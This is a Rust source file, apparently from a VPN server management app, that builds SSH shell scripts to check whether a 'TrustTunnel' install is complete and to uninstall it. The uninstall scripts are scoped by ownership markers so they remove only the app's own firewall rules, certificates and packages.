use super::super::*;
use super::super::sanitize::*;
use russh::client;

/// Derive the `partial` flag from the per-stage install probe (WIZARD-02; Codex
/// #4, #9; round-2 finding G). A server is "partial" when the binary is present
/// but the full official install chain is NOT complete: any config/cert artifact
/// missing, OR the systemd unit exists but is not enabled, OR the service is not
/// active. Pure fn so it is unit-testable under `cargo test --lib` without a live
/// SSH server.
///
/// FINDING G: `unit_exists && !unit_enabled` counts as partial — a unit that was
/// created but never `systemctl enable --now`d is NOT a complete install. The
/// frontend `resolveResume` consumes `unitExists`/`unitEnabled` distinctly, so the
/// probe reports both and `partial` folds them in.
///
/// Scope (LOW #13): assumes the CANONICAL `/opt/trusttunnel` install dir + default
/// filenames (`ENDPOINT_DIR`). Upstream `install.sh -o DIR` / custom `setup_wizard`
/// install paths are OUT OF SCOPE for this resume probe.
#[allow(clippy::too_many_arguments)]
fn derive_partial(
    binary: bool,
    credentials: bool,
    rules: bool,
    vpn: bool,
    hosts: bool,
    cert: bool,
    unit_exists: bool,
    unit_enabled: bool,
    unit_active: bool,
) -> bool {
    // Not installed at all → not "partial", it's a clean slate.
    if !binary {
        return false;
    }
    // Binary present: complete only when EVERY artifact is present AND the unit is
    // present + enabled + active. Anything missing (including a present-but-not-
    // enabled unit, finding G) is a partial install.
    let complete = credentials && rules && vpn && hosts && cert && unit_exists && unit_enabled && unit_active;
    !complete
}

/// Probe a single `test -f`-style artifact answer for `TT_EXISTS`.
fn probe_exists(raw: &str) -> bool {
    raw.trim().contains("TT_EXISTS")
}

/// Check if TrustTunnel is already installed on the server.
/// Returns JSON with per-stage idempotent "done?" booleans mirroring the REAL
/// install artifact chain (WIZARD-02; Codex #4): installed/version/serviceActive/
/// users (existing) PLUS binaryInstalled, credentialsExist, rulesExist,
/// vpnConfigExists, hostsConfigExists, certPresent, unitExists, unitEnabled, and
/// a derived `partial`. The frontend `resolveResume` keys off these.
/// NOTE: Uses direct connect (NOT pooled) — initial check before pool exists.
pub async fn check_server_installation(
    app: &tauri::AppHandle,
    params: SshParams,
) -> Result<serde_json::Value, String> {
    let handle = params.connect_with_app(app.clone()).await?;

    // Check for binary
    let (bin_check, _bin_code) = exec_command(
        &handle, app,
        &format!("test -f {bin} && echo TT_EXISTS || echo TT_MISSING", bin = ENDPOINT_BINARY)
    ).await?;
    let installed = bin_check.trim().contains("TT_EXISTS");

    // Get version if installed
    let version = if installed {
        let (ver, _) = exec_command(
            &handle, app,
            &format!("{bin} --version 2>/dev/null || echo unknown", bin = ENDPOINT_BINARY)
        ).await?;
        ver.trim().to_string()
    } else {
        String::new()
    };

    // Check service status (existing — kept verbatim).
    let (svc_status, _) = exec_command(
        &handle, app,
        "systemctl is-active trusttunnel 2>/dev/null || echo inactive"
    ).await?;
    let service_active = svc_status.trim() == "active";

    // ── Per-stage artifact probe mirroring the REAL install chain (Codex #4) ──
    // Batch all the cheap `test -f` checks into ONE script so we do not pay N SSH
    // round-trips. The script echoes a labelled TT_EXISTS / TT_MISSING line per
    // artifact; we parse the labels back out. The systemd `is-enabled` answer is
    // included in the same script.
    //
    // The cert is considered present when EITHER the Let's Encrypt live/ symlink
    // exists for any host OR the local certs/cert.pem copy exists (mirrors the two
    // cert layouts `build_configure_commands` writes — letsencrypt live/ vs
    // self-signed/provided certs/).
    //
    // Scope (LOW #13): canonical ENDPOINT_DIR only — see `derive_partial` doc.
    let (binary_installed, credentials_exist, rules_exist, vpn_config_exists, hosts_config_exists, cert_present, unit_exists, unit_enabled) = if installed {
        let sudo = detect_sudo(&handle, app).await;
        // WR-04 / round-2 finding J: dynamically-generated UUID heredoc delimiter
        // for the multi-line probe script — never a static delimiter. The body is
        // single-quoted so the writing shell performs no expansion; the labels are
        // literal and parsed back out below.
        let delim = format!("PROBE_EOF_{}", uuid::Uuid::new_v4().simple());
        // Codex #14 + round-2 finding A: the probe SHELL CONSTRUCTION is extracted
        // into a pure helper so a backend snapshot test can pin it against the real
        // /opt/trusttunnel → config → cert → systemd artifact chain without a live
        // server (mocked frontend flows do not cover this).
        let probe_script = build_probe_script(sudo, &delim);
        let (probe_out, _) = exec_command(&handle, app, &probe_script).await?;
        // Parse the labelled lines back into booleans.
        let line_for = |label: &str| -> bool {
            probe_out
                .lines()
                .find(|l| l.trim_start().starts_with(label))
                .map(probe_exists)
                .unwrap_or(false)
        };
        (
            line_for("BINARY_SW"),
            line_for("CREDENTIALS"),
            line_for("RULES"),
            line_for("VPNCFG"),
            line_for("HOSTSCFG"),
            line_for("CERT"),
            line_for("UNIT"),
            line_for("ENABLED"),
        )
    } else {
        (false, false, false, false, false, false, false, false)
    };

    // Get list of VPN users from credentials.toml
    let users: Vec<String> = if installed {
        let sudo = detect_sudo(&handle, app).await;
        let (creds_raw, _) = exec_command(
            &handle, app,
            &format!("{sudo}grep -oP 'username\\s*=\\s*\"\\K[^\"]+' {dir}/credentials.toml 2>/dev/null || echo ''", dir = ENDPOINT_DIR)
        ).await?;
        creds_raw.lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else {
        vec![]
    };

    handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();

    let partial = derive_partial(
        binary_installed,
        credentials_exist,
        rules_exist,
        vpn_config_exists,
        hosts_config_exists,
        cert_present,
        unit_exists,
        unit_enabled,
        service_active,
    );

    Ok(serde_json::json!({
        "installed": installed,
        "version": version,
        "serviceActive": service_active,
        "users": users,
        // Per-stage idempotent probe (Codex #4) — additive only, existing callers
        // (ServerPanel) ignore the new keys. unitExists/unitEnabled are DISTINCT
        // (finding G).
        "binaryInstalled": binary_installed,
        "credentialsExist": credentials_exist,
        "rulesExist": rules_exist,
        "vpnConfigExists": vpn_config_exists,
        "hostsConfigExists": hosts_config_exists,
        "certPresent": cert_present,
        "unitExists": unit_exists,
        "unitEnabled": unit_enabled,
        "partial": partial,
    }))
}

/// Build the per-stage artifact probe SHELL CONSTRUCTION (Codex #4 + #14, round-2
/// finding A). Pure fn → unit-testable under `cargo test --lib` so a snapshot test
/// can pin the constructed shell against the REAL deploy artifact chain
/// (`/opt/trusttunnel` → the four config files → cert layout → systemd unit) WITHOUT
/// a live SSH server. Mocked frontend `invoke` flows cannot verify this — the
/// server-truth model must not silently drift from what deploy actually writes.
///
/// `delim` is a dynamically-generated `PROBE_EOF_<uuid>` heredoc delimiter (WR-04 /
/// round-2 finding J — never a static delimiter). The body is single-quoted so the
/// WRITING shell performs no expansion; the labels are parsed back out by the caller.
pub(crate) fn build_probe_script(sudo: &str, delim: &str) -> String {
    let dir = ENDPOINT_DIR;
    format!(
        r#"{sudo}bash << '{delim}'
emit() {{ test -f "$1" && echo "$2 TT_EXISTS" || echo "$2 TT_MISSING"; }}
emit "{dir}/setup_wizard" BINARY_SW
emit "{dir}/credentials.toml" CREDENTIALS
emit "{dir}/rules.toml" RULES
emit "{dir}/vpn.toml" VPNCFG
emit "{dir}/hosts.toml" HOSTSCFG
# cert: LE live/ symlink (any host) OR local certs/cert.pem
if ls /etc/letsencrypt/live/*/fullchain.pem >/dev/null 2>&1 || test -f "{dir}/certs/cert.pem"; then
  echo "CERT TT_EXISTS"
else
  echo "CERT TT_MISSING"
fi
# systemd unit file present?
emit "/etc/systemd/system/trusttunnel.service" UNIT
# systemd unit enabled? (is-enabled prints "enabled" when enabled)
if systemctl is-enabled trusttunnel >/dev/null 2>&1; then
  echo "ENABLED TT_EXISTS"
else
  echo "ENABLED TT_MISSING"
fi
{delim}"#
    )
}

/// Build the EXTENDED, OWNERSHIP-SCOPED cleanup commands appended to the uninstall
/// script (D-04 full clean slate; Codex #7 + round-2 finding A + round-3 HIGH A).
///
/// "Start over" must be a GENUINELY full clean slate — but firewall removal must be
/// OWNERSHIP-SCOPED so it never clobbers a pre-existing admin firewall opening on the
/// user's own server. This helper produces:
///   (i)   Let's Encrypt state removal (certbot delete + rm -rf the live/archive/
///         renewal entries for {host}), so a re-issue is clean.
///   (ii)  ufw rules removed BY COMMENT: parse `ufw status numbered`, find ONLY the
///         lines carrying `trusttunnel-acme` (port 80) / `trusttunnel-tls` (port 443),
///         and `ufw --force delete <number>` each in DESCENDING order (so deleting one
///         does not renumber the next target). NEVER a broad `ufw --force delete allow
///         80/tcp` — that broad form matches an admin's bare rule and is FORBIDDEN.
///   (iii) iptables rules removed BY TAG: `iptables -D ... -m comment --comment
///         trusttunnel-managed` — matches ONLY the rule the (now-tagging) deploy
///         inserted, never an admin's untagged ACCEPT on the same port.
///
/// Pre-tag installs (iptables rules inserted by an OLDER build before tag-on-install)
/// carry NO comment, so the tagged `-D` does NOT match them and they are LEFT
/// untouched — we deliberately do NOT fall back to a broad untagged `-D` (that is
/// exactly the clobber risk). An open port with no service behind it is harmless
/// residue. This narrowing is documented in CONTEXT.md Deferred Ideas.
///
/// `host` is validated upstream by `validate_ssh_host` before it reaches here (no
/// shell metacharacters), so it is safe to interpolate. Pure fn → unit-testable under
/// `cargo test --lib` without a live server.
pub(crate) fn build_uninstall_extras(sudo: &str, host: &str, ssh_port: u16) -> String {
    format!(
        r#"echo "=== Step 5b: Remove Let's Encrypt state ({host}) ==="
{sudo}certbot delete --cert-name {host} --non-interactive 2>/dev/null || true
{sudo}rm -rf /etc/letsencrypt/live/{host} /etc/letsencrypt/archive/{host} /etc/letsencrypt/renewal/{host}.conf 2>/dev/null || true

echo "=== Step 5c: Remove TrustTunnel ufw rules BY COMMENT (ownership-scoped) ==="
# Delete ONLY rules whose comment marks them as ours. install_firewall tags rules
# with 'SSH (TrustTunnel)' / 'VPN (TrustTunnel)' / 'TrustTunnel VPN' / 'TrustTunnel
# QUIC' / 'HTTP cert renewal (TrustTunnel)', and the deploy stage with
# 'trusttunnel-acme' / 'trusttunnel-tls'. A case-insensitive 'trusttunnel' matches
# all the (TrustTunnel)-tagged ones; 'HTTP cert renewal' also matches the LEGACY
# 80/tcp comment written by older builds (pre this fix). Bare admin rules (no
# TrustTunnel comment) never match → never touched. Highest rule number first so
# renumbering does not shift the next target. NEVER a broad `ufw delete allow <port>`
# (that would clobber an admin's bare rule on the same port).
# BUGFIX (post-UAT): the old pattern grepped only 'trusttunnel-acme|trusttunnel-tls',
# which the install_firewall comments NEVER contain — so NO ufw rule was ever removed
# on uninstall (confirmed on a live server: all TrustTunnel rules survived).
#
# SACRED SSH PORT (post-UAT server-brick fix): install_firewall tags the SSH allow
# 'SSH (TrustTunnel)' (server_security.rs) — which the 'trusttunnel' grep MATCHES, so
# the old sweep DELETED the active SSH port's allow. If ufw then stayed enabled with
# default-deny (marker-less / admin-pre-active ufw — Step 5e below), the port was left
# closed → SSH timed out from BOTH the app and a terminal (the reported brick). Two
# guards make port {ssh_port} un-closable:
#   (1) RE-ASSERT the allow BEFORE the sweep — idempotent (ufw dedups), so the live
#       session survives even if a later `ufw reload` flushes conntrack mid-script.
#   (2) EXCLUDE the SSH port from the sweep by PORT TOKEN, never by comment tag
#       (change_ssh_port retags the rule plain 'SSH', so only the numeric port is a
#       reliable guard). The `(^|[^0-9])…([^0-9]|$)` anchor stops 22 from matching
#       2222 / 443 from matching 4433, and the trailing space/`(v6)` is `[^0-9]` so
#       BOTH the v4 rule and its IPv6 twin are spared.
if command -v ufw >/dev/null 2>&1; then
  # Re-assert the SSH allow BEFORE the sweep, but only when ufw is ACTIVE — an inactive
  # ufw has no lockout to defend against, and we must not write a rule into an admin's
  # stored-but-inactive ruleset (ownership boundary, Fable LOW-4). Idempotent when active.
  # `-w` matches the WHOLE word «active» so the «inactive» status never false-matches.
  {sudo}ufw status 2>/dev/null | head -1 | grep -qiw active && {sudo}ufw allow {ssh_port}/tcp comment 'SSH keep active session' >/dev/null 2>&1 || true
  # Delete via `ufw --force delete` — NOT `yes | ufw delete`: in this russh exec env `yes`
  # feeds sudo's stdin (not ufw's), the confirm is never answered, and NOTHING is deleted
  # (firewall_delete_rule documents the same trap — Fable MEDIUM-3).
  #
  # H-03: EXCLUDE the D-05 pre-allow rules (comment 'pre-existing admin service
  # (TrustTunnel)'). Those rules encode the ADMIN's connectivity — the fold added an
  # `ufw allow <port>/tcp` for each service the admin already ran, so `default deny
  # incoming` on the ufw WE enabled would not firewall it off. The old sweep matched
  # them via the case-insensitive 'trusttunnel' grep and deleted them EVEN WHEN ufw is
  # kept active (user unchecked «Брандмауэр»), re-locking-out the admin's service —
  # exactly the Pitfall-1 lockout D-05 was built to prevent, on the uninstall side.
  # When ufw IS purged/disabled these rules vanish with the firewall anyway, so never
  # deleting them here is correct under every branch.
  for tt_num in $({sudo}ufw status numbered 2>/dev/null | grep -iE 'trusttunnel|HTTP cert renewal' | grep -vE 'pre-existing admin service' | grep -vE '(^|[^0-9]){ssh_port}/tcp([^0-9]|$)' | grep -oE '^\[[ ]*[0-9]+\]' | grep -oE '[0-9]+' | sort -rn); do
    {sudo}ufw --force delete "$tt_num" 2>/dev/null || true
  done
fi

echo "=== Step 5d: Remove deploy-inserted iptables ACCEPT rules BY TAG (ownership-scoped) ==="
# Delete ONLY rules tagged `-m comment --comment trusttunnel-managed` — matches our
# rule, never an admin's untagged ACCEPT on the same port.
if command -v iptables >/dev/null 2>&1; then
  {sudo}iptables -D INPUT -p tcp --dport 80 -j ACCEPT -m comment --comment trusttunnel-managed 2>/dev/null || true
  {sudo}iptables -D INPUT -p tcp --dport 443 -j ACCEPT -m comment --comment trusttunnel-managed 2>/dev/null || true
fi
"#
    )
}

/// Shell preamble for `uninstall_server`: STOP an in-progress deploy before
/// removing files (05-UAT 2026-06-09 — "cancel must kill the remote process").
/// Reads the deploy process-group id recorded by `deploy::build_pidfile_record`
/// (/tmp/tt_deploy.pid) and TERM-then-KILLs ONLY that group, then
/// `dpkg --configure -a` heals a half-finished apt transaction left by the
/// interrupted install. The `[ "$TT_PGID" -gt 1 ]` guard means we can never
/// signal our own group or pid/group 0; this is scoped ON PURPOSE so the
/// system's own apt / unattended-upgrades is NEVER touched (we do not broad-kill
/// apt). Pure fn → unit-testable under `cargo test --lib`.
pub(crate) fn build_stop_in_progress(sudo: &str) -> String {
    format!(
        r#"echo "=== Step 0: Stop any in-progress TrustTunnel install ==="
if [ -f /tmp/tt_deploy.pid ]; then
  TT_PGID=$(tr -dc 0-9 < /tmp/tt_deploy.pid 2>/dev/null)
  if [ -n "$TT_PGID" ] && [ "$TT_PGID" -gt 1 ] 2>/dev/null; then
    {sudo}kill -TERM -"$TT_PGID" 2>/dev/null || true
    sleep 2
    {sudo}kill -KILL -"$TT_PGID" 2>/dev/null || true
  fi
  {sudo}rm -f /tmp/tt_deploy.pid 2>/dev/null || true
fi
{sudo}dpkg --configure -a 2>/dev/null || true
"#
    )
}

/// 18-10 — build the probe that reports whether OUR ufw/fail2ban INSTALL-markers exist, so
/// the build-time package-purge gate can fire on a LEGACY server (no snapshot). The markers
/// (`/opt/trusttunnel/.tt-installed-{ufw,fail2ban}`) are written by `install_firewall` /
/// `install_fail2ban` ONLY when the package was ABSENT before us → strictly stronger
/// ownership proof than the snapshot. Bare `test -f` → reads no file content (nothing can
/// leak, D-29). Emits fixed tokens parsed by `parse_pkg_marker_probe`. Pure fn →
/// unit-testable under `cargo test --lib`.
pub(crate) fn build_pkg_marker_probe(sudo: &str) -> String {
    format!(
        "{sudo}test -f /opt/trusttunnel/.tt-installed-ufw && echo UFW_PKG_OURS || echo UFW_PKG_NOT_OURS; \
         {sudo}test -f /opt/trusttunnel/.tt-installed-fail2ban && echo F2B_PKG_OURS || echo F2B_PKG_NOT_OURS"
    )
}

/// Parse `build_pkg_marker_probe` output into `(ufw_pkg_ours, fail2ban_pkg_ours)`. Pure fn.
pub(crate) fn parse_pkg_marker_probe(raw: &str) -> (bool, bool) {
    (raw.contains("UFW_PKG_OURS"), raw.contains("F2B_PKG_OURS"))
}

/// Per-component uninstall selection payload (UN-1, D-01/D-03). Each bool gates ONE
/// teardown branch in `build_uninstall_script`. The DEFAULT (D-03) is «restore to
/// exactly pre-install» → every flag true (remove everything WE installed); the
/// frontend dialog (plan 18-05) sends the user's checkbox state, and an omitted
/// payload defaults to `restore_all` in `uninstall_server`.
///
/// SECURITY (D-INV-2 / D-29): five booleans only — there is no secret-bearing field,
/// so the selection can never carry a credential/telemt secret into the log channel.
#[derive(Debug, Clone, Copy, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct UninstallSelection {
    // NOTE (18-UAT): there is intentionally NO `user_configs` field. Users are part of the
    // protocol and are ALWAYS removed with it — the optional «keep users» preserve path was
    // removed (owner decision) because a preserved credential list could not be re-adopted on
    // reinstall. `build_uninstall_script` unconditionally removes the whole install dir.
    /// Remove OUR ufw rules (always, via the comment-scoped sweep). The ufw PACKAGE is
    /// purged only when ALSO snapshot-proves-absent AND marker-present (D-07 triple-gate).
    pub ufw: bool,
    /// Remove OUR fail2ban jail (always). The fail2ban PACKAGE is purged only when ALSO
    /// snapshot-proves-absent AND marker-present (D-07 triple-gate).
    pub fail2ban: bool,
    /// Revert BBR — folded ONLY when the snapshot proves BBR was OFF before us (BBR is
    /// system-global → never revert an admin's pre-existing BBR — D-02b / T-18-15).
    pub bbr: bool,
    /// Remove MTProto (telemt) — folded ONLY when the snapshot proves telemt was ABSENT
    /// before us («old protocol ≠ ours», ownership evidence — D-05 / T-18-16).
    pub mtproto: bool,
}

impl UninstallSelection {
    /// D-03 default: restore to exactly pre-install — remove everything WE installed.
    /// Used when the frontend omits the selection payload (pre-18-05 callers) so the
    /// existing «удалить протокол» keeps its current full-revert behavior.
    pub fn restore_all() -> Self {
        Self { ufw: true, fail2ban: true, bbr: true, mtproto: true }
    }
}

impl Default for UninstallSelection {
    /// D-03: the honest default is a full restore-to-pre-install (NOT serde's all-false).
    fn default() -> Self {
        Self::restore_all()
    }
}

/// Build the Step-5e fail2ban de-provision block (ownership-scoped). Pure fn so the
/// D-07 package-purge gate is unit-testable.
///
/// `emit_purge=true` → today's two-branch block: WE-installed (marker `$TT_INSTALLED_F2B`)
/// gets the full purge (unban-all BEFORE stop — only a live daemon can unban — then stop,
/// disable, `apt-get purge`, drop `/etc/fail2ban` + the persisted `/var/lib/fail2ban` ban
/// DB); an admin-pre-existing fail2ban keeps the package (scope-unban THIS session's IP on
/// sshd, remove OUR jail.local, reload).
///
/// `emit_purge=false` + `selected=true` (D-06/D-07 conservative: user WANTS fail2ban removed
/// but ownership is unproven — admin's package / snapshot shows present) → NEVER stop/disable/
/// purge the daemon; lift a self-ban of THIS session's IP, remove OUR jail.local, reload so our
/// jail stops being enforced. The admin's fail2ban is left running.
///
/// `selected=false` (WR-2, Phase-18 re-review: user UNCHECKED fail2ban to KEEP brute-force
/// protection) → KEEP-AS-IS: do NOT remove `jail.local`, do NOT reload. Our `jail.local`
/// carries the admin-IP `ignoreip` self-ban whitelist + the chosen preset — deleting it left
/// the kept daemon on distro defaults with the admin's IP un-whitelisted (a later 5-fail SSH
/// typo would self-ban them with no app left to unban). Only lift a self-ban of THIS session's
/// IP as a safety net; the hardened jail stays intact.
pub(crate) fn build_fail2ban_deprovision(sudo: &str, selected: bool, emit_purge: bool) -> String {
    if !selected {
        // WR-2 keep-as-is: preserve our hardened jail.local (incl. the ignoreip whitelist);
        // only lift a self-ban of this session's IP. No jail.local removal, no reload.
        return format!(
            r#"if command -v fail2ban-client >/dev/null 2>&1 || dpkg -s fail2ban >/dev/null 2>&1; then
  # KEEP fail2ban (user unchecked it): leave OUR jail.local + the ignoreip whitelist in place.
  [ -n "$TT_SSH_IP" ] && {sudo}fail2ban-client set sshd unbanip "$TT_SSH_IP" 2>/dev/null || true
fi"#
        );
    }
    if emit_purge {
        format!(
            r#"if command -v fail2ban-client >/dev/null 2>&1 || dpkg -s fail2ban >/dev/null 2>&1; then
  if [ "$TT_INSTALLED_F2B" = "1" ]; then
    # We installed fail2ban (it was absent) → full purge, back to pre-TrustTunnel.
    # Unban EVERYTHING first (we own the whole install) while the daemon is still up.
    {sudo}fail2ban-client unban --all 2>/dev/null || true
    {sudo}systemctl stop fail2ban 2>/dev/null || true
    {sudo}systemctl disable fail2ban 2>/dev/null || true
    # M-01: purge ONLY the named package. The bare system-wide orphan-sweep that used
    # to follow removed EVERY package apt deemed orphaned, including orphans from the
    # admin's own earlier operations, over-reaching beyond "revert what we installed".
    # Dropped (the full rdepends "nothing depends on it" check stays deferred to the
    # live-UAT A1 checkpoint).
    {sudo}DEBIAN_FRONTEND=noninteractive apt-get purge -y fail2ban 2>/dev/null || true
    {sudo}rm -rf /etc/fail2ban 2>/dev/null || true
    # Drop the persisted ban DB so a residual boot-time restore can't re-ban the admin.
    {sudo}rm -rf /var/lib/fail2ban 2>/dev/null || true
  else
    # Admin already had fail2ban → keep the package + their jails. Lift ONLY a ban of
    # THIS session's IP on the sshd jail (never `unban --all` — that would clear the
    # admin's other jails), then remove our jail.local + reload.
    [ -n "$TT_SSH_IP" ] && {sudo}fail2ban-client set sshd unbanip "$TT_SSH_IP" 2>/dev/null || true
    {sudo}rm -f /etc/fail2ban/jail.local 2>/dev/null || true
    {sudo}systemctl reload fail2ban 2>/dev/null || {sudo}systemctl restart fail2ban 2>/dev/null || true
  fi
fi"#
        )
    } else {
        format!(
            r#"if command -v fail2ban-client >/dev/null 2>&1 || dpkg -s fail2ban >/dev/null 2>&1; then
  # Conservative (D-06/D-07): the user WANTS fail2ban removed but ownership is unproven
  # (the snapshot shows fail2ban pre-existed / no marker). KEEP the admin's package; NEVER
  # stop/disable/purge their daemon — only lift a self-ban of THIS session's IP on sshd,
  # remove OUR jail.local, and reload so our jail stops being enforced.
  [ -n "$TT_SSH_IP" ] && {sudo}fail2ban-client set sshd unbanip "$TT_SSH_IP" 2>/dev/null || true
  {sudo}rm -f /etc/fail2ban/jail.local 2>/dev/null || true
  {sudo}systemctl reload fail2ban 2>/dev/null || {sudo}systemctl restart fail2ban 2>/dev/null || true
fi"#
        )
    }
}

/// Build the Step-5e ufw de-provision block (ownership-scoped). Pure fn so the D-07
/// package-purge gate is unit-testable.
///
/// `emit_purge=true` → today's block: WE-installed (marker `$TT_INSTALLED_UFW`) → disable
/// (drops all enforcement so purging can never strand SSH) then `apt-get purge`; a
/// pre-existing-but-inactive ufw WE enabled (`$TT_ENABLED_UFW`) → just disable it back to
/// its prior state (keep the admin's package).
///
/// `emit_purge=false` + `selected=true` (D-06/D-07 conservative: user WANTS ufw removed but
/// ownership is unproven) → NEVER purge; only revert an inactive→active flip WE made
/// (`$TT_ENABLED_UFW`) so the admin's prior state is restored.
///
/// `selected=false` (WR-1, Phase-18 re-review: user UNCHECKED ufw to KEEP the firewall) →
/// KEEP-AS-IS: emit NOTHING (no `ufw --force disable`). install_firewall writes
/// `.tt-enabled-ufw` on every install where ufw was not already active, so the old conservative
/// branch would `ufw --force disable` the very firewall the user chose to keep — leaving the
/// server with no packet filtering. The FINAL SACRED SSH re-assert still guarantees the active
/// SSH port stays allowed (D-INV-1); the protocol's own 443/80 rules are removed by the
/// comment-scoped Step 5c sweep regardless.
pub(crate) fn build_ufw_deprovision(sudo: &str, selected: bool, emit_purge: bool) -> String {
    if !selected {
        // WR-1 keep-as-is: leave the firewall exactly as it is (still enabled). Nothing to emit.
        return String::new();
    }
    if emit_purge {
        format!(
            r#"if command -v ufw >/dev/null 2>&1; then
  if [ "$TT_INSTALLED_UFW" = "1" ]; then
    # We installed ufw (was absent → server had no firewall before) → full purge.
    {sudo}ufw --force disable 2>/dev/null || true
    # M-01: purge ONLY ufw — the bare system-wide orphan-sweep that used to follow could
    # cascade-remove the admin's own orphaned packages. Dropped.
    {sudo}DEBIAN_FRONTEND=noninteractive apt-get purge -y ufw 2>/dev/null || true
  elif [ "$TT_ENABLED_UFW" = "1" ]; then
    # ufw pre-existed but was INACTIVE before TrustTunnel enabled it → turn it back
    # off (its prior state). Keep the package — it is the admin's base tool.
    {sudo}ufw --force disable 2>/dev/null || true
  fi
fi"#
        )
    } else {
        format!(
            r#"if command -v ufw >/dev/null 2>&1; then
  # Conservative (D-06/D-07): the user WANTS ufw removed but ownership is unproven (snapshot
  # shows ufw pre-existed / no marker) → KEEP the package, never purge. Only revert an
  # inactive→active flip WE made so the admin's prior state is restored.
  if [ "$TT_ENABLED_UFW" = "1" ]; then
    {sudo}ufw --force disable 2>/dev/null || true
  fi
fi"#
        )
    }
}

/// Build the COMPLETE uninstall script body for «Начать заново» (D-04 full clean
/// slate, OWNERSHIP-SCOPED — round-3 HIGH A). Pure fn → unit-testable under
/// `cargo test --lib` without a live server, mirroring the `build_uninstall_extras`
/// / `build_stop_in_progress` pure-helper pattern.
///
/// COCOON COMPLETENESS (06-16 C-15/C-16/C-18): this script must remove EVERY server
/// path the install can write — see the COCOON MANIFEST doc-comment in `deploy.rs`
/// for the authoritative install-write ↔ uninstall-remove cross-reference, pinned by
/// the `cocoon_manifest_symmetry_every_owned_path_is_removed` unit test. Two LE-path
/// leaks closed here:
///   • C-15: the systemd DROP-IN dir `/etc/systemd/system/trusttunnel.service.d`
///     (created by `deploy.rs` `mkdir -p` for the zero-downtime `ExecReload`) is
///     removed with `rm -rf` BEFORE `systemctl daemon-reload` — `rm -f` on the
///     `*.service` glob never matched a `.d` DIRECTORY, so the drop-in survived.
///   • C-16: the cert-renewal helper `/usr/local/sbin/trusttunnel-cert-renew.sh`
///     (written by `deploy.rs` for cron renewal) is removed — Step 6 only swept
///     `/usr/local/bin` + `/usr/bin`, never `/usr/local/sbin`.
///
/// OWNERSHIP BOUNDARY (C-20): admin-shared apt PACKAGES (certbot/curl/iptables) are
/// deliberately NOT purged — removing a package an admin may rely on is an
/// over-deletion violation. We remove only the host's cert STATE (in
/// `build_uninstall_extras`) and OUR own files. Every removal targets a 100%-ours
/// path (`.service.d` drop-in dir, `/usr/local/sbin/trusttunnel*` glob) — no glob
/// that could match a foreign file.
///
/// SMART SECURITY DE-PROVISION (post-UAT exception to C-20): ufw + fail2ban — which
/// install_firewall / install_fail2ban can apt-install — ARE removed, but scoped by
/// OWNERSHIP MARKERS written at install time under `{dir}` (`.tt-installed-ufw`,
/// `.tt-enabled-ufw`, `.tt-installed-fail2ban`). Read in Step 0.6 BEFORE `{dir}` is
/// removed, applied in Step 5e: purge the PACKAGE only if WE installed it (marker
/// present); otherwise keep the admin's package and remove only OUR ufw rules +
/// fail2ban jail. `ufw --force disable` precedes any purge so the SSH session is
/// never stranded. The ufw rule sweep itself (Step 5c) is comment-scoped and runs
/// regardless of markers (it never touches a bare admin rule).
///
/// `host` is validated upstream by `validate_ssh_host` (whitelist — no shell
/// metacharacters) before reaching here; no NEW free-text SSH-reaching field is
/// introduced by this helper. `build_stop_in_progress` + `build_uninstall_extras`
/// are interpolated in (no inline duplicate of their bodies).
///
/// PHASE 18 — component-selective, snapshot-evidence-gated FULL REVERT (D-01/D-05/D-07):
///   - `selection` — per-component UN-1 checkboxes; each gates one teardown branch.
///   - `snapshot` — the pre-install evidence (18-01). `None` = legacy server (D-06
///     conservative marker-only path).
///   - `telemt_port` — resolved by `uninstall_server` via an explicit telemt.toml read
///     (the `_secret` is read but NEVER logged, D-29); threaded straight into
///     `build_telemt_teardown`. Unused when the MTProto gate does not fire.
///
/// GATES (18-UAT owner principle — remove ONLY what WE created, proven by OUR marker):
///   - MTProto fold (`build_telemt_teardown`): `selection.mtproto` AND `mtproto_is_ours`
///     (the `/opt/trusttunnel/.tt-installed-mtproto` marker OUR install writes). WR-8: the
///     snapshot's "telemt was absent before us" is NO LONGER an authorization — first-touch
///     absence does not prove the CURRENTLY-installed telemt is ours (an admin could have
///     installed their own AFTER us). Since 18-09 every app MTProto install writes the marker,
///     so a normal install is fully removable; an admin's own telemt (no marker) is NEVER
///     folded (D-05). A pre-18-09 app-installed MTProto has no marker until reinstalled.
///   - BBR fold (`build_bbr_revert`): `selection.bbr` AND the `.tt-bbr-prior` ownership marker
///     OUR `enable_bbr` writes (`bbr_prior_marker`) records a revertable algo. WR-8: the
///     snapshot's recorded pre-install value is NO LONGER an authorization to revert (same
///     reasoning). The marker both PROVES ownership and carries the exact prior algo, gated
///     through `bbr_revert_target` so an admin's own BBR / an unknown prior is NEVER reverted
///     (system-global ownership — D-02b preserved).
///   - install dir: ALWAYS removed in full (`rm -rfv {dir}`) — users are part of the protocol
///     and go with it. There is no keep-users option (18-UAT: removed by owner decision, since a
///     preserved credential list could not be re-adopted on reinstall).
///   - Package purge (ufw/fail2ban): emitted only when `selection.<pkg>` AND ownership is
///     proven — 18-10: by the `.tt-installed-{ufw,fail2ban}` install-marker
///     (`ufw_pkg_ours`/`fail2ban_pkg_ours`, written ONLY when the package was ABSENT before
///     us → strictly stronger proof than the snapshot) OR the snapshot proving the package
///     was absent pre-install. A snapshot proving the package PRESENT no longer vetoes when
///     the marker is set (the marker is authoritative). With NEITHER (legacy, admin's
///     pre-existing package) the conservative branch keeps the package. The in-shell
///     `$TT_INSTALLED_*` marker gate stays as a belt-and-suspenders double gate; the
///     rules/jail cleanup stays unconditional. This SUPERSEDES the earlier M-01
///     «never purge without snapshot» — the install-marker is better ownership evidence.
///
/// The FINAL unconditional SACRED SSH-port re-assert stays LAST for EVERY selection combo
/// (D-INV-1) — the MTProto/BBR folds are placed BEFORE it so the SSH allow is the last word.
///
/// The arg list mirrors the deploy artifact chain (dir/svc/host/ports) plus the two Phase 18
/// inputs (selection + snapshot); bundling them into a struct would not aid readability here,
/// so we allow the lint exactly as `derive_partial` above does.
#[allow(clippy::too_many_arguments)]
pub(crate) fn build_uninstall_script(
    sudo: &str,
    dir: &str,
    svc: &str,
    host: &str,
    ssh_port: u16,
    telemt_port: u16,
    mtproto_is_ours: bool,
    // 18-10: install/enable ownership markers read by `uninstall_server` BEFORE {dir} is
